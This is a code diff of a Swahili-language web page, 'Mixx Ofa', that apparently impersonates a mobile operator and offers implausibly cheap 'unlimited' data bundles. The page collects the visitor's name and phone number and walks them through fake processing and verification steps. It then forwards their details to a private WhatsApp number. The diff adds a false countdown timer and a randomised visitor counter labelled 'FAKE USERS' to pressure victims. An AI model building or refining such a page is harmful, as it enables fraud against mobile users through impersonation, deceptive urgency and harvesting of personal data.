@@ -1,18 +1,93 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mixx Ofa</title>
+
+<style>
+body {margin:0;font-family:Arial;}
+
+/* TOP BAR */
+#liveUsers {
+background:black;
+color:yellow;
+text-align:center;
+padding:10px;
+font-size:14px;
+}
+
+/* HERO */
+.hero {
+height:100vh;
+background:url('poster.jpg') no-repeat center center/cover;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+/* BOX */
+.overlay {
+background:rgba(0,0,0,0.7);
+padding:25px;
+border-radius:12px;
+text-align:center;
+color:white;
+width:90%;
+max-width:350px;
+}
+
+/* INPUT */
+input {
+width:100%;
+padding:12px;
+margin-top:10px;
+border-radius:8px;
+border:none;
+}
+
+/* BUTTON */
+button {
+width:100%;
+padding:12px;
+margin-top:10px;
+border-radius:8px;
+border:none;
+background:yellow;
+font-weight:bold;
+cursor:pointer;
+}
+
+/* OPTIONS */
+.option {
+background:#111;
+margin-top:10px;
+padding:10px;
+border-radius:8px;
+cursor:pointer;
+}
+</style>
+</head>
+
 <body>
 
+<div id="liveUsers">🔥 Watu 17 wanaendelea sasa hivi</div>
+
 <div class="hero">
-  <div class="overlay" id="app">
+<div class="overlay" id="app">
 
-    <h2>Huduma ya Haraka ya Mixx</h2>
+<h2>Huduma ya Haraka ya Mixx</h2>
 
-    <input type="text" id="name" placeholder="Majina kamili">
-    <input type="number" id="phone" placeholder="Namba yako">
+<p id="timer">⏳ Ofa inaisha ndani ya 05:00</p>
 
-    <button onclick="step1()">ENDELEA</button>
+<input type="text" id="name" placeholder="Majina kamili">
+<input type="number" id="phone" placeholder="Namba yako">
 
-    <p id="status"></p>
+<button onclick="step1(); vibrate();">ENDELEA</button>
 
-  </div>
+<p id="status"></p>
+
+</div>
 </div>
 
 <script>
@@ -20,74 +95,111 @@ let userName = "";
 let userPhone = "";
 let selectedPackage = "";
 
-// STEP 1
+/* STEP 1 */
 function step1(){
-  userName = document.getElementById("name").value;
-  userPhone = document.getElementById("phone").value;
+userName = document.getElementById("name").value;
+userPhone = document.getElementById("phone").value;
 
-  if(userName=="" || userPhone==""){
-    document.getElementById("status").innerHTML="⚠️ Jaza taarifa zako zote";
-    return;
-  }
-
-  document.getElementById("app").innerHTML =
-  "<p>⏳ Inachakata taarifa zako...</p>";
-
-  setTimeout(step2,2000);
+if(userName=="" || userPhone==""){
+document.getElementById("status").innerHTML="⚠️ Jaza taarifa zote";
+return;
 }
 
-// STEP 2
+document.getElementById("app").innerHTML =
+"<p>⏳ Inachakata taarifa zako...</p>";
+
+setTimeout(step2,2000);
+}
+
+/* STEP 2 */
 function step2(){
-  document.getElementById("app").innerHTML = `
-  <h3>Chagua Kifurushi</h3>
+document.getElementById("app").innerHTML = `
+<h3>Chagua Kifurushi</h3>
 
-  <div class="option" onclick="selectPackage('75GB - 3570')">
-  75GB kwa Tsh 3,570 BILA KIKOMO
-  </div>
+<div class="option" onclick="selectPackage('75GB - 3570')">
+75GB kwa Tsh 3,570 BILA KIKOMO
+</div>
 
-  <div class="option" onclick="selectPackage('100GB - 5999')">
-  100GB kwa Tsh 5,999 BILA KIKOMO
-  </div>
-  `;
+<div class="option" onclick="selectPackage('100GB - 5999')">
+100GB kwa Tsh 5,999 BILA KIKOMO
+</div>
+`;
 }
 
-// STEP 3
+/* STEP 3 */
 function selectPackage(pkg){
-  selectedPackage = pkg;
+selectedPackage = pkg;
 
-  document.getElementById("app").innerHTML =
-  "<p>⏳ Inachakata chaguo lako...</p>";
+document.getElementById("app").innerHTML =
+"<p>⏳ Inachakata chaguo lako...</p>";
 
-  setTimeout(step3,2000);
+setTimeout(step3,2000);
 }
 
-// STEP 4
+/* STEP 4 */
 function step3(){
-  document.getElementById("app").innerHTML = `
-  <p>🔐 Thibitisha ili kuendelea</p>
-  <button onclick="step4()">THIBITISHA</button>
-  `;
+document.getElementById("app").innerHTML = `
+<p>🔐 Thibitisha ili kuendelea</p>
+<button onclick="step4()">THIBITISHA</button>
+`;
 }
 
-// STEP 5
+/* STEP 5 */
 function step4(){
-  document.getElementById("app").innerHTML =
-  "<p>📩 Endelea ili uweze kupokea Msimbo wa uthibitisho na menu ya kupokea vifurushi...</p>";
+document.getElementById("app").innerHTML =
+"<p>📩 Endelea ili uweze kupokea Msimbo wa uthibitisho na menu ya kupokea vifurushi...</p>";
 
-  setTimeout(finish,2500);
+setTimeout(finish,2500);
 }
 
-// FINAL STEP
+/* FINAL STEP (WHATSAPP LAST) */
 function finish(){
 
-  let message = "MTEJA MPYA%0A"
-  + "Jina: " + userName + "%0A"
-  + "Namba: " + userPhone + "%0A"
-  + "Kifurushi: " + selectedPackage;
+document.getElementById("app").innerHTML =
+"<p style='color:#0f0;'>✔ Imekamilika! Tunakuunganisha na mhudumu...</p>";
 
-  window.location.href =
-  "https://wa.me/255780467038?text=" + message;
+setTimeout(function(){
+
+let message = "MTEJA MPYA%0A"
++ "Jina: " + userName + "%0A"
++ "Namba: " + userPhone + "%0A"
++ "Kifurushi: " + selectedPackage;
+
+window.location.href =
+"https://wa.me/255780467038?text=" + message;
+
+},3000);
+
+}
+
+/* TIMER */
+let time = 300;
+setInterval(function(){
+let minutes = Math.floor(time / 60);
+let seconds = time % 60;
+
+document.getElementById("timer").innerHTML =
+"⏳ Ofa inaisha ndani ya " +
+minutes + ":" + (seconds<10?"0":"") + seconds;
+
+if(time > 0){ time--; }
+},1000);
+
+/* FAKE USERS */
+setInterval(function(){
+let num = Math.floor(Math.random()*30)+10;
+
+document.getElementById("liveUsers").innerHTML =
+"🔥 Watu " + num + " wanaendelea sasa hivi";
+},4000);
+
+/* VIBRATION */
+function vibrate(){
+if(navigator.vibrate){
+navigator.vibrate(200);
+}
 }
 </script>
 
 </body>
+</html>
